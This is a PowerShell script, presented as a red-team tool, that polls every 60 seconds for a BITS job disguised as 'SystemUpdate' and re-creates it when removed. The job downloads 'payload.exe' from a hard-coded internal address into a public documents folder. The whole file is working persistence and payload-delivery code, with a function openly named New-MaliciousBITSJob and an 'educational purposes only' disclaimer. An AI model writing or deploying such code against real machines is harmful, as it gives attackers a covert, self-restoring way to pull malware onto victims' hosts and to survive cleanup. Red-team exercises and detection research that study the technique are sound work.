<#
.SYNOPSIS
    BITS Job Persistence Monitor
.DESCRIPTION
    Monitors for the existence of a specific BITS job and recreates it if removed.
    Designed for authorized red team exercises and security research.
.NOTES
    Author: Security Research Lab
    Date: 2026-07-23
    Use: Educational purposes only
#>

# Configuration
$jobName = "SystemUpdate"
$payloadURL = "http://192.168.1.100/payload.exe"
$localPath = "C:\Users\Public\Documents\update.exe"
$logFile = "C:\temp\bits_monitor.log"

function Write-Log {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $Message" | Out-File -FilePath $logFile -Append
    Write-Host "$timestamp - $Message"
}

function Test-BITSJob {
    param([string]$Name)
    $job = Get-BitsTransfer -Name $Name -ErrorAction SilentlyContinue
    return ($job -ne $null)
}

function New-MaliciousBITSJob {
    param(
        [string]$Name,
        [string]$Source,
        [string]$Destination
    )

    Write-Log "Creating BITS job: $Name"

    try {
        # Remove existing job if present
        Get-BitsTransfer -Name $Name -ErrorAction SilentlyContinue | Remove-BitsTransfer

        # Create new job
        $job = Start-BitsTransfer -Source $Source `
                                  -Destination $Destination `
                                  -DisplayName $Name `
                                  -Asynchronous `
                                  -Priority Normal

        Write-Log "BITS job created successfully"
        return $true
    }
    catch {
        Write-Log "ERROR: Failed to create BITS job - $($_.Exception.Message)"
        return $false
    }
}

# Main monitoring loop
Write-Log "BITS Monitor started"

while ($true) {
    if (-not (Test-BITSJob -Name $jobName)) {
        Write-Log "BITS job not found. Recreating..."
        New-MaliciousBITSJob -Name $jobName -Source $payloadURL -Destination $localPath
    }
    else {
        Write-Log "BITS job exists. Monitoring..."
    }

    # Check every 60 seconds
    Start-Sleep -Seconds 60
}
